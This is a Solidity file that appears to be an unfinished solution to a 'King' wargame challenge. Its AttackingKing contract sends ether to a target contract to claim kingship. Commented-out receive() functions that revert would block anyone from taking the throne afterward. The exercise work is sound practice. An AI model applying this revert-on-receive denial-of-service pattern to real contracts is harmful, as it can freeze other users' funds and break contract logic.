// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address payable public contractAddress;
    // King public kingContract;

    constructor(address _contractAddress) payable {
        contractAddress = payable(_contractAddress); 
        // kingContract = King(contractAddress);
    }

    // receive() external payable {
    //     revert("f u all");
    // }

    // receive() external payable {
    //     // require(msg.value >= kingContract.prize || msg.sender == kingContract.owner);
    //     // kingContract.king.transfer(msg.value);
    //     // kingContract.king = payable(msg.sender);
    //     // kingContract.prize = msg.value;
    //     revert("f u");
    // }

    function hackContract() external {
        // Code me! 
        // payable(address(this)).transfer(200 ether);
        // payable(address(contractAddress)).transfer(200 ether);
        // address(contractAddress).call({value: 200 ether});
        // payable(address(contractAddress)).transfer(200 ether);
        // payable(address(this)).transfer(2 ether).gas(1000000);
        // king(2 ether); 
        // contractAddress.transfer(address(this).balance); 
        (bool success, ) = contractAddress.call{value: 5 ether, gas: 30000000}(""); 
    }
}
